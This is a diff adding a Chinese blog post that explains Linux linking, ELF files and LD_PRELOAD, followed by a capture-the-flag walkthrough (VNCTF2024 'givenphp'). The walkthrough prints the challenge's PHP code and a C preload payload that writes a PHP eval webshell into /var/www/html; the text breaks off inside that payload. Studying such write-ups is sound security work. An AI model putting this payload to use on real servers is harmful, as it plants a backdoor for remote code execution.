@@ -1,0 +1,683 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>LD_PRELOAD学习 - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="LD_PRELOAD学习" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/ld_preload/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-21T20:53:41+08:00" />
+<meta property="article:modified_time" content="2024-02-21T20:53:41+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="LD_PRELOAD学习"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/ld_preload/" /><link rel="prev" href="http://ML-hacker.github.io/posts/sql-rce/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "LD_PRELOAD学习",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/ld_preload/"
+        },"genre": "posts","keywords": "环境变量注入","wordcount":  712 ,
+        "url": "http://ML-hacker.github.io/posts/ld_preload/","datePublished": "2024-02-21T20:53:41+08:00","dateModified": "2024-02-21T20:53:41+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">LD_PRELOAD学习</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-21">2024-02-21</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-21">2024-02-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;712 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="0x0f前言" class="headerLink">
+    <a href="#0x0f%e5%89%8d%e8%a8%80" class="header-mark"></a>0x0f前言</h1><hr>
+<p>最近也是打了一些比赛，在VNCTF中看见了这个<code>LD_PRELOAD</code>于是来学习一下（似乎p神的文章也是有写的）这里结合了很多篇文章（<del>比赛频率得降低一点不然天天都在打比赛没时间研究东西了</del>）
+也是好久也没有更新博客了。</p>
+<h1 id="0x01基础知识" class="headerLink">
+    <a href="#0x01%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="header-mark"></a>0x01基础知识</h1><hr>
+<h2 id="what-is-ld_preload" class="headerLink">
+    <a href="#what-is-ld_preload" class="header-mark"></a>what is LD_PRELOAD</h2><p><code>LD_PRELOAD</code>是<code>Linux/Unix</code>系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。
+但是也是分情况的：
+To avoid this mechanism being used as an attack vector for <em>suid/sgid</em> executable binaries, the loader ignores <em>LD_PRELOAD</em> if <em>ruid != euid</em>. For such binaries, only libraries in standard paths that are also <em>suid/sgid</em> will be preloaded.
+也就是如果ruid != euid的时候加载器会忽略<code>LD_PRELOAD</code></p>
+<h2 id="linking-of-programs" class="headerLink">
+    <a href="#linking-of-programs" class="header-mark"></a>Linking of programs</h2><p><figure><img
+        
+        loading="lazy"
+        src="/img/ld_preload//img/ld_preload/ld_preload1.png"
+        srcset="/img/ld_preload//img/ld_preload/ld_preload1.png, /img/ld_preload//img/ld_preload/ld_preload1.png 1.5x, /img/ld_preload//img/ld_preload/ld_preload1.png 2x"
+        alt="/img/ld_preload//img/ld_preload/ld_preload1.png"
+        title="/img/ld_preload//img/ld_preload/ld_preload1.png" ></figure>
+首先可以看看一个文件转换为一个可执行程序的活动：</p>
+<ul>
+<li>驱动首先运行cpp将<code>main.c</code>转化为ASCII中间文件<code>main.i</code></li>
+<li>接下来，驱动运行ccl，将<code>main.i</code>转化为ASCII汇编语言文件<code>main.s</code></li>
+<li>然后用as转化为二进制目标文件<code>main.o</code></li>
+<li>最后运行链接器ID，结合了<code>main.o</code>和<code>sum.o</code>创建可执行对象
+shell 调用操作系统中称为<strong>loader</strong>的函数，该函数将可执行文件 prog 中的代码和数据复制到内存中，然后将控制权转移到程序的开头</li>
+</ul>
+<h3 id="static-linking" class="headerLink">
+    <a href="#static-linking" class="header-mark"></a><strong>Static Linking</strong></h3><p>静态链接器（例如 Linux <strong>ld</strong>程序（在编译器驱动程序中使用））将可重定位目标文件和命令行参数的集合作为输入，并生成可加载和运行的完全链接的可执行目标文件作为输出。输入可重定位目标文件由各种代码和数据部分组成，其中每个部分都是连续的字节序列。指令位于一个部分，已初始化的全局变量位于另一部分，未初始化的变量位于另一部分,并且在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
+而在构建可执行文件的时候linker需要执行两个主要的任务</p>
+<ul>
+<li><strong>Symbol resolution</strong>（符号解析）:目标文件定义和引用符号</li>
+<li><strong>Relocation</strong>（搬迁）:编译器和汇编器生成从地址 0 开始的代码和数据节。</li>
+</ul>
+<h3 id="object-files" class="headerLink">
+    <a href="#object-files" class="header-mark"></a><strong>Object Files</strong></h3><p>而前面说的符号解析中的目标文件的定义，那么目标文件有几种类型呢？
+Object files come in three forms:</p>
+<ul>
+<li><strong>Relocatable object file(可重定位目标文件)</strong>
+包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件组合以创建可执行目标文件。</li>
+<li><strong>Executable object file(可执行目标文件)</strong>
+包含可以直接复制到内存并执行的形式的二进制代码和数据。</li>
+<li><strong>Shared object file(共享对象文件)</strong>
+一种特殊类型的可重定位目标文件，可以在加载时或运行时加载到内存中并动态链接。</li>
+</ul>
+<p>编译器和汇编器生成可重定位目标文件，链接器可以生成可执行目标文件，对象文件根据特定的对象文件格式进行组织，该格式因系统而异。</p>
+<h3 id="relocatable-object-file" class="headerLink">
+    <a href="#relocatable-object-file" class="header-mark"></a>Relocatable object file</h3><p>这里的话也是直接拿ELF文件做例子
+<figure><img
+        
+        loading="lazy"
+        src="/img/ld_preload/ld_preload2.png"
+        srcset="/img/ld_preload/ld_preload2.png, /img/ld_preload/ld_preload2.png 1.5x, /img/ld_preload/ld_preload2.png 2x"
+        alt="/img/ld_preload/ld_preload2.png"
+        title="/img/ld_preload/ld_preload2.png" ></figure>
+这个是典型的EFI文件格式。
+ELF 标头以 16 字节序列开始，描述生成文件的系统的字大小和字节顺序。ELF 头的其余部分包含允许链接器解析和解释目标文件的信息。
+<del>偷懒粘贴一下</del>~
+**<em>.text</em>**已编译程序的机器代码。<br>
+**<em>.rodata</em>**只读数据，例如 printf 语句中的格式字符串、switch 语句的跳转表。<br>
+**<em>.data</em>**初始化的全局和静态 C 变量。局部 C 变量在运行时在堆栈上维护，不会出现在 .data 或 .bss 部分中。<br>
+**<em>.bss</em>**未初始化的全局和静态 C 变量，以及初始化为零的任何全局或静态变量。该部分在目标文件中不占用实际空间；它只是一个占位符。目标文件格式区分已初始化变量和未初始化变量以提高空间效率：未初始化变量不必占用目标文件中的任何实际磁盘空间。在运行时，这些变量在内存中分配，初始值为零。<br>
+**<em>.symtab</em>**符号表，其中包含有关程序中定义和引用的函数和全局变量的信息。一些程序员错误地认为必须使用 -g 选项编译程序才能获取符号表信息。事实上，每个可重定位目标文件在 .symtab 中都有一个符号表（除非程序员使用 strip 命令专门将其删除）。但是，与编译器内的符号表不同，.symtab 符号表不包含局部变量的条目。<br>
+<strong><em>.rel.text</em></strong> .text 节中的位置列表，当链接器将此目标文件与其他文件组合时需要修改这些位置。一般来说，任何调用外部函数或引用全局变量的指令都需要修改。另一方面，调用局部函数的指令不需要修改。请注意，可执行目标文件中不需要重定位信息，并且通常会省略重定位信息，除非用户明确指示链接器包含它。<br>
+**<em>.rel.data</em>**模块引用或定义的任何全局变量的重定位信息。一般来说，任何初始值为全局变量或外部定义函数的地址的已初始化全局变量都需要修改。<br>
+**<em>.debug</em>**调试符号表，其中包含程序中定义的局部变量和 typedef、程序中定义和引用的全局变量以及原始 C 源文件的条目。仅当使用 -g 选项调用编译器驱动程序时它才存在。<br>
+**<em>.line</em>**原始 C 源程序中的行号与 .text 部分中的机器代码指令之间的映射。仅当使用 -g 选项调用编译器驱动程序时它才存在。<br>
+<strong><em>.strtab</em></strong> .symtab 和 .debug 节中的符号表以及节标题中的节名称的字符串表。字符串表是一系列以空字符结尾的字符串。</p>
+<h3 id="executable-object-file" class="headerLink">
+    <a href="#executable-object-file" class="header-mark"></a>Executable object file</h3><p><figure><img
+        
+        loading="lazy"
+        src="/img/ld_preload/LD_PRELOAD4.png"
+        srcset="/img/ld_preload/LD_PRELOAD4.png, /img/ld_preload/LD_PRELOAD4.png 1.5x, /img/ld_preload/LD_PRELOAD4.png 2x"
+        alt="/img/ld_preload/LD_PRELOAD4.png"
+        title="/img/ld_preload/LD_PRELOAD4.png" ></figure>
+可执行目标文件的格式与可重定位目标文件的格式类似。ELF 标头描述了文件的整体格式。它还包括程序的入口点，即程序运行时要执行的第一条指令的地址。 .text 、.rodata和.data_节与可重定位目标文件中的节类似，只不过这些节已被重定位到其最终的运行时内存地址。 .init_部分定义了一个名为___init的小函数，它将由程序的初始化代码调用。由于可执行文件是_完全链接_（重定位）的，因此它不需要.rel部分。</p>
+<h3 id="link-with-static-linker" class="headerLink">
+    <a href="#link-with-static-linker" class="header-mark"></a>Link with static linker</h3><p>静态链接库，在Linux下文件名后缀为<code>.a</code>，如<code>libstdc++.a</code>。在编译链接时直接将目标代码加入可执行程序。
+在链接的时候，链接器只会复制程序应用的目标模块来减少可执行程序的大小。
+具体的链接过程这里就不写了。</p>
+<h3 id="dynamic-linking-with-shared-libraries" class="headerLink">
+    <a href="#dynamic-linking-with-shared-libraries" class="header-mark"></a>Dynamic Linking with Shared Libraries</h3><p>静态库缺点的现代创新。共享库是一个对象模块，可以在运行时或加载时加载到任意内存地址并与内存中的程序链接。此过程称为_动态链接，由称为__动态链接器_的程序执行。共享库也称为共享对象，在 Linux 系统上它们由_.so_后缀表示。 Microsoft 操作系统大量使用共享库，他们将其称为 DLL（动态链接库）。
+<figure><img
+        
+        loading="lazy"
+        src="/img/ld_preload/LD_PRELOAD3.png"
+        srcset="/img/ld_preload/LD_PRELOAD3.png, /img/ld_preload/LD_PRELOAD3.png 1.5x, /img/ld_preload/LD_PRELOAD3.png 2x"
+        alt="/img/ld_preload/LD_PRELOAD3.png"
+        title="/img/ld_preload/LD_PRELOAD3.png" ></figure>
+这个是与共享库动态链接过程图
+为了构建示例向量例程的共享库_libvector.so_，我们使用一些针对编译器和链接器的特殊指令来调用编译器驱动程序：
+linux&gt; gcc -shared -fpic -o libvector.so addvec.c multvec.c
+-fpic表示编译器生成与位置无关的代码。-shared表示让链接器创建共享对象文件
+链接：
+linux&gt; gcc -o prog2l main.c ./libvector.so
+这样去创建了一个可执行文件prog2l，但是需要注意的是，libvector里面的任何数据都不会实际的复制到可执行文件当中，而是进行了引用。</p>
+<h3 id="file-name-rules-for-dynamic-link-libraries" class="headerLink">
+    <a href="#file-name-rules-for-dynamic-link-libraries" class="header-mark"></a>File name rules for dynamic link libraries</h3><p><code>libname.so.x.y.z</code></p>
+<ul>
+<li><code>lib</code>：统一前缀。</li>
+<li><code>so</code>：统一后缀。</li>
+<li><code>name</code>：库名，如libstdc++.so.6.0.21的name就是stdc++。</li>
+<li><code>x</code>： <strong>主版本号</strong> 。表示库有重大升级，不同主版本号的库之间是<strong>不兼容</strong>的。如libstdc++.so.6.0.21的主版本号是6。</li>
+<li><code>y</code>： <strong>次版本号</strong> 。表示库的增量升级，如增加一些新的接口。在主版本号相同的情况下， <strong>高的次版本号向后兼容低的次版本号</strong> 。如libstdc++.so.6.0.21的次版本号是0。</li>
+<li><code>z</code>： <strong>发布版本号</strong> 。表示库的优化、bugfix等。相同的主次版本号，不同的发布版本号的库之间 <strong>完全兼容</strong> 。如libstdc++.so.6.0.21的发布版本号是21。</li>
+</ul>
+<h3 id="dynamic-link-library-search-path-search-sequence" class="headerLink">
+    <a href="#dynamic-link-library-search-path-search-sequence" class="header-mark"></a>Dynamic link library search path search sequence</h3><ul>
+<li>编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li>
+<li>环境变量<code>LD_LIBRARY_PATH</code>指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li>
+<li>配置文件<code>/etc/ld.so.conf</code>中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li>
+<li>默认的动态库搜索路径<code>/lib</code>；</li>
+<li>默认的动态库搜索路径<code>/usr/lib</code>；</li>
+</ul>
+<h2 id="0x02exploition" class="headerLink">
+    <a href="#0x02exploition" class="header-mark"></a>0x02EXPLOITION</h2><h3 id="demo" class="headerLink">
+    <a href="#demo" class="header-mark"></a>demo</h3><p>攻击过程：</p>
+<ol>
+<li>定义一个函数，函数的名称、变量及变量类型、返回值及返回值类型都要与要替换的函数完全一致。这就要求我们在写动态链接库之前要先去翻看一下对应手册等。</li>
+<li>将所写的 c 文件编译为动态链接库。</li>
+<li>对 LD_PRELOAD 及逆行设置，值为库文件路径，接下来就可以实现对目标函数原功能的劫持了</li>
+<li>结束攻击，使用命令 unset LD_PRELOAD 即可</li>
+</ol>
+<p>这里取VNCTF2024的givenphp的题目作为demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;upload&#39;</span><span class="p">])){</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">handleFileUpload</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;challenge&#39;</span><span class="p">])){</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">waf</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$value</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$func</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;putenv(&#39;</span><span class="si">$key</span><span class="s2">=</span><span class="si">$value</span><span class="s2">&#39;);&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$func</span><span class="o">==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">]){</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\&#39;|&#34;|%|\(|\)|;|bash/i&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\&#39;|&#34;|%|\(|\)|;|bash/i&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">])){</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;evil input!!!&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">handleFileUpload</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$uploadDirectory </span><span class="o">=</span> <span class="s1">&#39;/tmp/&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;文件上传失败。&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$fileExtension </span><span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$newFileName </span><span class="o">=</span> <span class="nx">uniqid</span><span class="p">(</span><span class="s1">&#39;uploaded_file_&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$fileExtension</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$destination </span><span class="o">=</span> <span class="nv">$uploadDirectory </span><span class="o">.</span> <span class="nv">$newFileName</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$destination</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$destination</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;文件移动失败。&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们只看对环境做操作的部分</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nv">$func</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;putenv(&#39;</span><span class="si">$key</span><span class="s2">=</span><span class="si">$value</span><span class="s2">&#39;);&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$func</span><span class="o">==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">]){</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看一下whoami调用的静态链接库
+<figure><img
+        
+        loading="lazy"
+        src="/img/ld_preload/ld-preload5.png"
+        srcset="/img/ld_preload/ld-preload5.png, /img/ld_preload/ld-preload5.png 1.5x, /img/ld_preload/ld-preload5.png 2x"
+        alt="/img/ld_preload/ld-preload5.png"
+        title="/img/ld_preload/ld-preload5.png" ></figure>
+可以看见这里调用了很多。利用puts</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">platload</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s2">&#34;echo &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/shell.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
